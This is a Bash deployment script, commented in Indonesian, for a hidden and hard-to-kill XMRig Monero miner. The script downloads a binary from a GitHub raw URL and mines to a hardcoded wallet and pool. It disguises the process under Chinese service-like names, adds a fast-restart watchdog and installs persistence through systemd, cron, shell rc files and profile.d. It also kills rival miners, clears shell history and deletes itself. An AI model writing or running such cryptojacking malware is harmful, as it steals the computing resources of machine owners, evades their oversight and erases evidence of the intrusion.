#!/usr/bin/env bash
#=============================================================================
# ANTI-KILL XMRig Deploy — graymeams/teams
#=============================================================================
# Karakteristik anti-kill:
#   - Binary name: karakter Mandarin panjang (susah diketik manual)
#   - Workdir: ~/.cache/.<random_10char> (hidden, dalem)
#   - Watchdog: restart <1 detik kalau miner mati
#   - 3-layer persistence: systemd user service + cron + bashrc hook
#   - Zero log, zero pid file
#   - Password unique per server: sha256sum(hostname) 12 char pertama
#   - Bisa override via argumen: bash deploy.sh mypassword
#   - Wallet hardcode, pool hardcode
#=============================================================================
set -e

# ===== HARDCODED CONSTANTS =====
WALLET="43sxNTTWiKQj4LehDazVb8NQRKDztwiRcPFCivj3PbrqFPhujjxLd5TDCWfT6edSPXVRmUh3vhxysA35uHWnwY5UKGxvYFB"
POOL_URL="pool.supportxmr.com:443"
REPO_USER="grayteams"
REPO_NAME="teams"
BRANCH="main"
RAW_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"

# ===== UTILITY FUNCTIONS =====
randstr() {
    if [ -r /dev/urandom ]; then
        tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c "$1" 2>/dev/null
    else
        # fallback: /dev/urandom gak ada (misal container tertentu)
        openssl rand -hex 16 2>/dev/null | tr -dc 'a-z0-9' | head -c "$1" 2>/dev/null
    fi
}

download() {
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 30 --max-time 120 -o "$2" "$1"
    elif command -v wget >/dev/null 2>&1; then
        wget -q --timeout=30 -O "$2" "$1"
    else
        return 1
    fi
}

# ===== DEEP CLEAN ALL PREVIOUS INSTANCES =====
# PENTING: stop persistence dulu, baru kill process.
# Disable set -e sementara, deep clean harus jalan terus walau ada error.

set +e

MARKER_FILE="$HOME/.cache/.miner_instance"

# Step 1: Stop & disable semua systemd service sisa
for f in "$HOME"/.config/systemd/user/svc-*.service /etc/systemd/system/svc-*.service 2>/dev/null; do
    [ -f "$f" ] || continue
    svcname=$(basename "$f" .service)
    systemctl --user stop "$svcname" 2>/dev/null
    systemctl --user disable "$svcname" 2>/dev/null
    systemctl stop "$svcname" 2>/dev/null
    systemctl disable "$svcname" 2>/dev/null
    rm -f "$f" 2>/dev/null
done
systemctl --user daemon-reload 2>/dev/null
systemctl daemon-reload 2>/dev/null

# Step 2: Bersihin cron (pakai -E buat portabillity GNU+BusyBox)
rm -f /etc/cron.d/.sys_mk_* 2>/dev/null
if command -v crontab >/dev/null 2>&1; then
    crontab -l 2>/dev/null | grep -vE 'mk_[a-z0-9]{8}' | crontab - 2>/dev/null
fi

# Step 3: Bersihin rc hooks & profile.d
for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile"; do
    [ -f "$rc" ] || continue
    if grep -qE 'mk_[a-z0-9]{8}' "$rc" 2>/dev/null; then
        grep -vE 'mk_[a-z0-9]{8}' "$rc" > "${rc}.t" 2>/dev/null && mv "${rc}.t" "$rc" 2>/dev/null
    fi
done
rm -f /etc/profile.d/.sys_mk_*.sh 2>/dev/null

# Step 4: Baca marker SEBELUM dihapus
if [ -f "$MARKER_FILE" ]; then
    OLD_WD=$(head -1 "$MARKER_FILE" 2>/dev/null)
    if [ -n "$OLD_WD" ] && [ -d "$OLD_WD" ]; then
        pgrep -f "$OLD_WD" 2>/dev/null | xargs -r kill -9 2>/dev/null
    fi
    rm -f "$MARKER_FILE" 2>/dev/null
fi

# Step 5: Kill semua process Mandarin (grep -E buat GNU+BusyBox)
ps aux 2>/dev/null | grep -E '系统|核心|缓存|管理|数据库|维护|守护|进程|网络|存储|日志|监控|引擎|调度|备份|同步|服务|安全|认证|配置' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null

# Step 6: Kill watchdog
pgrep -f 'wd_[a-z0-9]\{12\}' 2>/dev/null | xargs -r kill -9 2>/dev/null

# Step 7: Kill process yang jalan dari .cache_
ps aux 2>/dev/null | grep '/\.cache/.cache_' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null

sleep 0.5

# Step 8: Double-tap — kill lagi kalau masih ada yang lolos
ps aux 2>/dev/null | grep -E '系统|核心|缓存|管理|数据库|维护|守护|进程|网络|存储|日志|监控|引擎|调度|备份|同步|服务|安全|认证|配置' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null
pgrep -f 'wd_[a-z0-9]\{12\}' 2>/dev/null | xargs -r kill -9 2>/dev/null
# Bersihin process anjak .cache_ double-tap
ps aux 2>/dev/null | grep '/\.cache/.cache_' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null

# Step 9: Hapus semua workdir
rm -rf "$HOME"/.cache/.cache_* 2>/dev/null

# Re-enable set -e
set -e

# ===== GENERATE RANDOM NAMES =====
# Pool karakter Mandarin yang mirip nama service sistem
# Gunakan array dengan karakter UTF-8 langsung
MANDARIN_PARTS=(
    "系统"       # system
    "核心"       # core
    "缓存"       # cache
    "管理"       # management
    "数据库"     # database
    "维护"       # maintenance
    "守护"       # guard/daemon
    "进程"       # process
    "网络"       # network
    "存储"       # storage
    "日志"       # log
    "监控"       # monitor
    "引擎"       # engine
    "调度"       # scheduler
    "备份"       # backup
    "同步"       # sync
    "服务"       # service
    "安全"       # security
    "认证"       # authentication
    "配置"       # configuration
)

# Generate binary name: 5-8 karakter Mandarin
BIN_NAME=""
MCOUNT=$(( (RANDOM % 4) + 5 ))  # 5 to 8 parts
for i in $(seq 1 $MCOUNT); do
    idx=$(( RANDOM % ${#MANDARIN_PARTS[@]} ))
    BIN_NAME="${BIN_NAME}${MANDARIN_PARTS[$idx]}"
done
# Tambah suffix alphanumeric biar makin unik
BIN_NAME="${BIN_NAME}_d$(randstr 8)"

# Generate workdir name
WORKDIR_NAME=".cache_$(randstr 10)"
WORKDIR="$HOME/.cache/$WORKDIR_NAME"

# Generate watchdog script name
WDOG_NAME="wd_$(randstr 12)"

# Generate systemd service name
SVC_NAME="svc-$(randstr 10)"

# Generate cron marker name (buat identifikasi di crontab)
CRON_MARKER="mk_$(randstr 8)"

# ===== DETECT ARCHITECTURE =====
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        BIN_SRC="systemx86"
        ;;
    aarch64|arm64)
        BIN_SRC="system64"
        ;;
    *)
        echo "[-] Arsitektur tidak didukung: $ARCH" >&2
        exit 1
        ;;
esac

# ===== GENERATE UNIQUE PASSWORD =====
# $1 override — kalau ada argumen, pakai itu sebagai password
if [ -n "${1:-}" ]; then
    PASS="$1"
elif command -v hostname >/dev/null 2>&1; then
    PASS=$(hostname | sha256sum | cut -c1-12)
elif [ -f /etc/machine-id ] && [ -s /etc/machine-id ]; then
    PASS=$(sha256sum /etc/machine-id | cut -c1-12)
elif [ -f /var/lib/dbus/machine-id ] && [ -s /var/lib/dbus/machine-id ]; then
    PASS=$(sha256sum /var/lib/dbus/machine-id | cut -c1-12)
elif command -v hostnamectl >/dev/null 2>&1; then
    PASS=$(hostnamectl hostname 2>/dev/null | sha256sum | cut -c1-12)
else
    PASS=$(date +%s | sha256sum | cut -c1-12)
fi

# ===== CREATE HIDDEN WORKDIR =====
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Write marker biar next deploy bisa kill + cleanup yang lama
printf '%s\n%s\n%s\n' "$WORKDIR" "$SVC_NAME" "$CRON_MARKER" > "$MARKER_FILE"

# ===== DOWNLOAD BINARY =====
if ! download "${RAW_URL}/${BIN_SRC}" "${BIN_NAME}"; then
    echo "[-] Gagal download binary dari ${RAW_URL}/${BIN_SRC}" >&2
    exit 1
fi
chmod +x "$BIN_NAME"

# ===== GENERATE CONFIG.JSON =====
cat > config.json << XMREOF
{
    "autosave": true,
    "donate-level": 0,
    "donate-over-proxy": 0,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "max-threads-hint": 75
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "${POOL_URL}",
            "user": "${WALLET}",
            "pass": "${PASS}",
            "keepalive": true,
            "tls": true
        }
    ]
}
XMREOF
chmod 600 config.json

# ===== CREATE WATCHDOG SCRIPT =====
cat > "$WDOG_NAME" << WDOGEOF
#!/usr/bin/env bash
# watchdog-${CRON_MARKER}
cd "${WORKDIR}"
while true; do
    ./${BIN_NAME} -c config.json >/dev/null 2>&1
    sleep 0.1
done
WDOGEOF
chmod +x "$WDOG_NAME"

# ===== LAYER 1: SYSTEMD USER SERVICE =====
setup_systemd() {
    if ! command -v systemctl >/dev/null 2>&1; then
        return 1
    fi

    # Cek apakah systemd --user bisa jalan
    if ! systemctl --user daemon-reload 2>/dev/null; then
        # Mungkin environment gak support (SSH tanpa lingering)
        # Coba enable lingering kalau punya loginctl
        if command -v loginctl >/dev/null 2>&1; then
            loginctl enable-linger 2>/dev/null || true
        fi
        # Kalau tetep gak bisa, fallback ke system-wide (butuh root)
        if [ "$(id -u)" = "0" ]; then
            mkdir -p /etc/systemd/system
            cat > "/etc/systemd/system/${SVC_NAME}.service" << EOF
[Unit]
Description=System Cache Management Service
After=network.target

[Service]
Type=simple
ExecStart=${WORKDIR}/${WDOG_NAME}
Restart=always
RestartSec=0
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
            systemctl daemon-reload 2>/dev/null || true
            systemctl enable "$SVC_NAME" 2>/dev/null || true
            systemctl start "$SVC_NAME" 2>/dev/null || true
            return 0
        fi
        return 1
    fi

    # User service path
    mkdir -p "$HOME/.config/systemd/user"
    cat > "$HOME/.config/systemd/user/${SVC_NAME}.service" << EOF
[Unit]
Description=System Cache Management Service
After=default.target

[Service]
Type=simple
ExecStart=${WORKDIR}/${WDOG_NAME}
Restart=always
RestartSec=0
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable "$SVC_NAME" 2>/dev/null || true
    systemctl --user start "$SVC_NAME" 2>/dev/null || true
    return 0
}

# ===== LAYER 2: CRON (user crontab + /etc/cron.d fallback) =====
setup_cron() {
    local CRON_EVERY_MIN="* * * * * pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || (cd ${WORKDIR} && nohup ./${WDOG_NAME} >/dev/null 2>&1 &)"
    local CRON_REBOOT="@reboot (sleep \$((RANDOM % 30)) && cd ${WORKDIR} && nohup ./${WDOG_NAME} >/dev/null 2>&1 &)"

    local CRON_OK=0

    # Method 1: user crontab
    if command -v crontab >/dev/null 2>&1; then
        # Hapus entry lama dengan marker yang sama kalau ada
        local TMP_CRON=$(mktemp 2>/dev/null || echo "/tmp/.cron_tmp_$(randstr 6)")
        crontab -l 2>/dev/null | grep -v "$CRON_MARKER" > "$TMP_CRON" 2>/dev/null || true
        {
            echo "# ${CRON_MARKER}"
            echo "$CRON_EVERY_MIN"
            echo "$CRON_REBOOT"
        } >> "$TMP_CRON"
        crontab "$TMP_CRON" 2>/dev/null && CRON_OK=1
        rm -f "$TMP_CRON" 2>/dev/null || true
    fi

    # Method 2: /etc/cron.d (kalau root)
    if [ "$CRON_OK" = "0" ] && [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; then
        local CRON_FILE="/etc/cron.d/.sys_${CRON_MARKER}"
        cat > "$CRON_FILE" << EOF
# ${CRON_MARKER}
${CRON_EVERY_MIN}
${CRON_REBOOT}
EOF
        chmod 644 "$CRON_FILE" 2>/dev/null || true
        CRON_OK=1
    fi

    # Method 3: /etc/crontab append (kalau root dan gak bisa bikin file baru)
    if [ "$CRON_OK" = "0" ] && [ -f /etc/crontab ] && [ -w /etc/crontab ]; then
        grep -q "$CRON_MARKER" /etc/crontab 2>/dev/null || {
            echo "# ${CRON_MARKER}" >> /etc/crontab
            echo "$CRON_EVERY_MIN" >> /etc/crontab
            echo "$CRON_REBOOT" >> /etc/crontab
        }
        CRON_OK=1
    fi

    return $([ "$CRON_OK" = "1" ])
}

# ===== LAYER 3: SHELL RC HOOK (bashrc, profile, zshrc) =====
setup_shellrc() {
    local HOOK="pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || (cd ${WORKDIR} && nohup ./${WDOG_NAME} >/dev/null 2>&1 &) 2>/dev/null # ${CRON_MARKER}"

    local RC_OK=0
    for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile"; do
        if [ -f "$rc" ]; then
            # Hapus hook lama dengan marker yang sama
            if grep -q "$CRON_MARKER" "$rc" 2>/dev/null; then
                local TMP_RC=$(mktemp 2>/dev/null || echo "/tmp/.rc_tmp_$(randstr 6)")
                grep -v "$CRON_MARKER" "$rc" > "$TMP_RC" 2>/dev/null || true
                cat "$TMP_RC" > "$rc" 2>/dev/null || true
                rm -f "$TMP_RC" 2>/dev/null || true
            fi
            echo "$HOOK" >> "$rc"
            RC_OK=1
        fi
    done

    # Kalau gak ada satupun rc file, bikin .bashrc
    if [ "$RC_OK" = "0" ]; then
        echo "$HOOK" >> "$HOME/.bashrc"
    fi

    return 0
}

# ===== LAYER 4 (EXTRA): /etc/profile.d drop-in (kalau root) =====
setup_profile_d() {
    if [ -d /etc/profile.d ] && [ -w /etc/profile.d ]; then
        local PF_FILE="/etc/profile.d/.sys_${CRON_MARKER}.sh"
        cat > "$PF_FILE" << EOF
# ${CRON_MARKER}
pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || (cd ${WORKDIR} && nohup ./${WDOG_NAME} >/dev/null 2>&1 &) 2>/dev/null
EOF
        chmod 644 "$PF_FILE" 2>/dev/null || true
        return 0
    fi
    return 1
}

# ===== EXECUTE ALL PERSISTENCE LAYERS =====
SYSTEMD_OK=0
CRON_OK=0
RC_OK=0

setup_systemd && SYSTEMD_OK=1 || true
setup_cron && CRON_OK=1 || true
setup_shellrc && RC_OK=1 || true
setup_profile_d 2>/dev/null || true   # bonus layer, silent

# ===== LAUNCH WATCHDOG — hanya kalau systemd & cron GAGAL =====
# Kalau systemd/cron udah start, jangan launch manual (bisa double)
if [ "$SYSTEMD_OK" != "1" ] && [ "$CRON_OK" != "1" ]; then
    nohup ./"$WDOG_NAME" >/dev/null 2>&1 &
    disown 2>/dev/null || true
fi

# ===== HAPUS TRACE =====
# Hapus history kalau bash
[ -n "${HISTFILE:-}" ] && [ -f "$HISTFILE" ] && history -c 2>/dev/null; true
# Hapus skrip deploy sendiri kalau jalan dari file
if [ -f "$0" ] && [ "$(basename "$0")" != "bash" ]; then
    rm -f "$0" 2>/dev/null || true
fi

# ===== REPORT =====
echo "============================================"
echo "  DEPLOY COMPLETE"
echo "============================================"
echo "  Arch      : $ARCH ($BIN_SRC)"
echo "  Binary    : $BIN_NAME"
echo "  Workdir   : $WORKDIR"
echo "  Password  : $PASS"
echo "  systemd   : $([ "$SYSTEMD_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "  cron      : $([ "$CRON_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "  shellrc   : $([ "$RC_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "  Status    : Watchdog running"
echo "============================================"